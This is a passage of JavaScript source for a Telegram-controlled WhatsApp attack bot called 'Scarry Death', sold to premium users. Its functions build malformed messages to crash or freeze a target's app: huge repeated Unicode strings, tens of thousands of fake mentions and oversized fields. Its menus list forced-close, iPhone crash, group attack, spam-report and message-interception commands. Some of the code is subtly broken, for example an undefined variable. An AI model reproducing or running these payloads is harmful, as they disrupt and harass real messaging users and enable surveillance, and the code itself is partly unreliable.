}
)
await sock.relayMessage("status@broadcast", msg.message, {
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: jid }, content: undefined }
]
}
]
}
],
statusJidList: [jid],
messageId: msg.key.id
})
if (mention) {
await sock.relayMessage(
jid,
{
statusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
},
{}
)
}
await sleep(1500)
}
} catch (err) {}
}

async function SaturnDelayV3(jid) {
    let permissionX = await generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⟅༑𝐒𝖆𝖙𝖚𝖗𝖓⟅༑",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ᯓ| 𝗭𝖆𝖑𝖙𝖍𝖗𝖊𝖝 𝐒𝖆𝖙𝖚𝖗𝖓 ᝄ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [jid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: jid },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [jid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: jid },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function DelayHard(jid) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: jid,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(jid, stickerMsg.message, {});

await sock.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [jid],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: jid },
              content: []
            },
          ],
        },
      ],
    },
  ],
});

console.log("â Sticker berhasil dikirim tanpa error.");
}

async function LocationDelay(jid) {
const travasMessage = Array.from({ length: 30000 }, (_, r) => ({
    title: "ᥬྀ​᭄".repeat(92000) + "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
     
       const msg = {
     viewOnceMessage: {
      message: {
        locationMessage: {
                degreesLatitude: -9.09999262999,
                degreesLongitude: 199.99963118999,
                name: "🧪̷⃰Ꮡ͜͡𝙄𝙣𝙫𝙞𝙨 ► 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣? ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(10000),
                address: "🧪̷⃰Ꮡ͜͡𝙄𝙣𝙫𝙞𝙨 ► 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣? ᜆ",
                url: `https://lol.crazyapple.${"🩸".repeat(25000)}.com`,
                sections: travasMessage,
            contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "5521992999999@s.whatsapp.net"
            ),
                        groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            fromMe: false,
            participant: "5521992999999@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "trigger newsletter ( @AnosReal6 )",    
            },
          },
        }
        }
        }
        }
        const Message = generateWAMessageFromContent(jid, jid, travasMessage, { viewOnceMessage: {
            message: { travasMessage }
            }
            }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: jid }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      jid,
      {
        StatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Fuck_You_Mark" },
            content: undefined,
          },
        ],
      }
    );
      console.log(chalk.red(`[+] XEON Ultimate FC dikirim ke ${jid}`));
  }
}

async function Blankv1raraa(jid) {
  try {
    await sock.relayMessage(
      jid,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "mampus luu?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: jid },
        userJid: jid,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function Blankv2raraa(jid) {
  try {
    await sock.relayMessage(
      jid,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "gimana kabarnya?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "sock - Crasher",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: jid },
        userJid: jid,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function Blankv3raraa(jid) {
  try {
    await sock.relayMessage(
      jid,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "jawab anjing?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: jid },
        userJid: jid,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function Blankv4raraa(jid) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "sock anjai mabar" + "ꦾ".repeat(45000),
                address: "MedanWok 😹"
              },
            },
            body: {
              text: "sock lu gabut kahh" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: jid,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid,
    });
  } catch (err) {
    console.log(err);
  }
}

async function Blankv5raraa(jid) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "sock lawack luu 😹" + "ꦾ".repeat(45000),
                address: "MedanWok 😹",
              },
            },
            body: {
              text: "sock Pen duit wak" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: jid,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                documentMessage: {
                  fileName: "sock-Doc.txt",
                  mimetype: "text/plain",
                  fileLength: 999999999,
                  caption: "sock Crasher Neverdie?",
                  pageCount: 9999,
                  mediaKey: "\u0000".repeat(50),
                  jpegThumbnail: Buffer.from(""),
                },
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid,
    });
  } catch (err) {
    console.log(err);
  }
} 

async function Blankdocu(jid) {
  const docu = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Don't be afraid of haters because haters are people who have lost in the competition." + "ꦽ".repeat(70000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "./Raraaimupp",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "Https://Raraaxd"
          },
          contextInfo: {
             remoteJid: "status@broadcast",
             participant: "6281933605296@s.whatsapp.net",
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },              
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "Https://Raraaxd",
                    "flow_message_version": "3"
                })
              },  
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, proto.Message.fromObject(docu), { userJid: jid });
  await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
}

async function XClose(jid) {
const Crash = "ꦽ".repeat(15000);
const msg = generateWAMessageFromContent(jid, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "*~_@1_~*" + "ꦾ".repeat(2000),
          listType: 4,
          buttonText: { displayText: "X" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [jid],
            participant: "0@s.whatsapp.net",
            remoteJid: "XClose¿?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "Verse Kill You",
              body: "Null is Here🔥 ".repeat(2000),
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: jid,
              participant: jid,
              quotedMessage: {
                conversation:
                  "hayy🔥⃰" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: jid, 
          }
        }
      }
    }
  }, {})
  await sock.relayMessage(jid, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes To Send Bug To ${jid}`));
}

// END FUNCTION
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const waktuRunPanel = getUptime();
  const randomImage = getRandomImage();

  bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote><b>– [ 𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘛𝘰 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩 18 GΣП 1] –</b></blockquote>

<blockquote><b>༄ 𝐈 𝐍 𝐅 𝐎 𝐑 𝐌 𝐀 𝐒 𝐈 ༄</b></blockquote>
ケ 𝘉𝘰𝘵 𝘕𝘢𝘮𝘦 : 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩
ケ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 18 GΣП 1
ケ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 : @raraa_imuppp
ケ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳𝟤 : @Alxzystore
ケ 𝘙𝘶𝘯𝘛𝘪𝘮𝘦 : ${waktuRunPanel}
ケ 𝘓𝘢𝘶𝘯𝘨𝘢𝘨𝘦 : 𝘑𝘢𝘷𝘢𝘚𝘤𝘳𝘪𝘱𝘵
<blockquote><b>♫ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀 ♫</b></blockquote>
〢 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${msg.from.username} 
〢 𝘜𝘴𝘦𝘳 𝘐𝘋 : ${msg.chat.id}
〢 𝘚𝘵𝘢𝘵𝘶𝘴 : 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
<blockquote><b>( ! ) sᴇʟʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ʙᴇʟᴏᴡ</b></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          ],
          [
          { text: "「🕊」𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "trashmenu" },
          { text: "「⚙️︎」𝑨𝑪𝑪𝑬𝑺", callback_data: "owner_menu" },
          ],
          [
          { text: "「🌈」𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "tols" },
          ],
          [{ text: "「🫂」𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", callback_data: "produk" }], 
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const senderId = query.from.id;
    const waktuRunPanel = getUptime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `
<blockquote><b>♫ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀 ♫
ケ 𝘉𝘰𝘵 𝘕𝘢𝘮𝘦 : 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩
ケ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 18 GΣП 1
ケ 𝘙𝘶𝘯𝘛𝘪𝘮𝘦 : ${waktuRunPanel}
〢 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${query.from.username}
〢 𝘜𝘴𝘦𝘳 𝘐𝘋 : ${query.message.chat.id}
〢 𝘚𝘵𝘢𝘵𝘶𝘴 : 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
──────────────────⬡
</b></blockquote>
<blockquote><b>〢 ALL BUG SCARRY 〣</b></blockquote>
<blockquote><b>〢  DELAY MENU 〣</b></blockquote>
 ▢ /delayhard - 628xx
 ▢ /delaymention - 628xx
 ▢ /delayfreze - 628xx
 ▢ /invisibletext - 628xx
 ▢ /drainquota - 628xx
──────────────────⬡
<blockquote><b>〢 BLANK X UI MENU 〣</b></blockquote>
 ▢ /comboall - 628xx
 ▢ /blankinfinity - 628xx
 ▢ /blankinfinityv2 - 628xx
 ▢ /mentionui - 628xx
 ▢ /crashhome - 628xx
 ▢ /testfuntion - 628xx
<blockquote><b>〢 FORCLOSE MENU 〣</b></blockquote>
 ▢ /forclose1msg - 628xx
 ▢ /fcinfinity - 628xx
<blockquote><b>〢 BUG GROUP MENU 〣</b></blockquote>
 ▢ /blankgorup - link
 ▢ /invisgroup - link
 ▢ /attackgroup - link
──────────────────⬡
<blockquote><b>〢 BUG IPHONE 〣</b></blockquote>
 ▢ /fciphone - 628xx
 ▢ /crashIphone - 628xx
──────────────────⬡
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙", callback_data: "back_to_main" }]],
      };
    }

    if (query.data === "owner_menu") {
      caption = `
<blockquote><b>♫ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀 ♫
ケ 𝘉𝘰𝘵 𝘕𝘢𝘮𝘦 : 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩
ケ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 18 GΣП 1
ケ 𝘙𝘶𝘯𝘛𝘪𝘮𝘦 : ${waktuRunPanel}
〢 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${query.from.username}
〢 𝘜𝘴𝘦𝘳 𝘐𝘋 : ${query.message.chat.id}
〢 𝘚𝘵𝘢𝘵𝘶𝘴 : 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
──────────────────⬡
</b></blockquote>
<blockquote><b>〢 𝗔𝗰𝗰𝗲𝘀 ⚙️ 〣</b></blockquote>
 ケ /addadmin 
 ケ /deladmin 
 ケ /addprem 
 ケ /delprem
 ケ /setcd 
 ケ /grouponly on|off
 ケ /addpair 628xx
 ケ /listpair
<blockquote><b>〢 𝗦𝗲𝗻𝗱𝗲𝗿 𝗔𝗱𝗽 🚀 〣</b></blockquote>
ケ /cadp - (nama plta,pltc,domain)
ケ /mulai -(nama adp)
ケ /listadp - (Daftar Adp Tersimpan)
ケ /deladp - (angka|menghapus list adp)
<blockquote><b>〢 𝗦𝗮𝗱𝗮𝗽 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 𝗠𝗲𝗻𝘂 〣</b></blockquote>
ケ /wa_on (aktifkan sadapnya)
ケ /wa_off (matikan sadapnya)
ケ /kirimpesan (support text dan all media)
ケ /kirimpesan (sender idgroup support all media)
ケ /addstory (support all media)
⚠︎ᴰⁱ ᴴᵃʳᵃᵖᵏᵃⁿ ˢᵃᵃᵗ ᴹᵃᵘ ᴮᵘᵍ ᴹᵃᵗⁱᵏᵃⁿ ᴰᵘˡᵘ ᶠⁱᵗᵘʳ ˢᵃᵈᵃᵖⁿʸᵃ⚠︎
──────────────────⬡
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙", callback_data: "back_to_main" }]],
      };
    }
    
    if (query.data === "tols") {
      caption = `
<blockquote><b>♫ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀 ♫
ケ 𝘉𝘰𝘵 𝘕𝘢𝘮𝘦 : 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩
ケ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 18 GΣП 1
ケ 𝘙𝘶𝘯𝘛𝘪𝘮𝘦 : ${waktuRunPanel}
〢 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${query.from.username}
〢 𝘜𝘴𝘦𝘳 𝘐𝘋 : ${query.message.chat.id}
〢 𝘚𝘵𝘢𝘵𝘶𝘴 : 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
──────────────────⬡
</b></blockquote>
<blockquote><b>〢 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 🛠 〣 </b></blockquote>
 ケ /SpamPairing
 ケ /SpamCall
 ケ /hapusbug
 ケ /SpamReportWhatsapp
──────────────────⬡
<blockquote><b>〢 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 🦧 〣</b></blockquote>
 ケ /tourl
 ケ /getcode
 ケ /ig
 ケ /tiktok
 ケ /iqc
 ケ /play
 ケ /cekip
 ケ /iptrack
 ケ /cekhost
 ケ /brat
 ケ /pinterest
 ケ /ping
──────────────────⬡
`;

replyMarkup = {
        inline_keyboard: [[{ text: "🔙", callback_data: "back_to_main" }]],
      };
    }
    
    if (query.data === "produk") {
      caption = `
<blockquote><b>〢 THANKS TO 🫂 〣</b></blockquote>
<b>༄𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 : @raraa_imuppp</b>
<b>༄𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳𝟤 : @Alxzystore</b>
<b>༄𝘈𝘴𝘪𝘴𝘵𝘦𝘯 : @rulzoffc</b>
<b>༄𝘈𝘴𝘪𝘴𝘵𝘦𝘯² : @yogzzstr</b> 
<b>༄Channel : @kepoluyee</b>
──────────────────⬡
`;
      replyMarkup = {
        inline_keyboard: [[{ text: "🔙", callback_data: "back_to_main" }]],
      };
    }

    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>– [ 𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘛𝘰 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩 18 GΣП 1] –</b></blockquote>

<blockquote><b>༄ 𝐈 𝐍 𝐅 𝐎 𝐑 𝐌 𝐀 𝐒 𝐈 ༄</b></blockquote>
ケ 𝘉𝘰𝘵 𝘕𝘢𝘮𝘦 : 𝘚𝘤𝘢𝘳𝘳𝘺 𝘋𝘦𝘢𝘵𝘩
ケ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 18 GΣП 1
ケ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 : @raraa_imuppp
ケ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳𝟤 : @Alxzystore
ケ 𝘙𝘶𝘯𝘛𝘪𝘮𝘦 : ${waktuRunPanel}
ケ 𝘓𝘢𝘶𝘯𝘨𝘢𝘨𝘦 : 𝘑𝘢𝘷𝘢𝘚𝘤𝘳𝘪𝘱𝘵
<blockquote><b>♫ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀 ♫</b></blockquote>
〢 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${query.from.username}
〢 𝘜𝘴𝘦𝘳 𝘐𝘋 : ${query.message.chat.id}
〢 𝘚𝘵𝘢𝘵𝘶𝘴 : 𝘉𝘶𝘺 𝘖𝘯𝘭𝘺
<blockquote><b>( ! ) sᴇʟʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ʙᴇʟᴏᴡ</b></blockquote>
`,
      replyMarkup = {
        inline_keyboard: [
          [
          ],
          [
          { text: "「🕊」𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "trashmenu" },
          { text: "「⚙️︎」𝑨𝑪𝑪𝑬𝑺", callback_data: "owner_menu" },
          ],
          [
          { text: "「🌈」𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "tols" },
          ],
          [{ text: "「🫂」𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", callback_data: "produk" }], 
        ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//
bot.onText(/\/blankinfinityv2 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kontol! ${cooldown} .`);
  }

  // ===== CEK PREMIUM =====
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Developer",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

   // caption awal (proses)
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Blank InfinityV2
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

let count = 0;
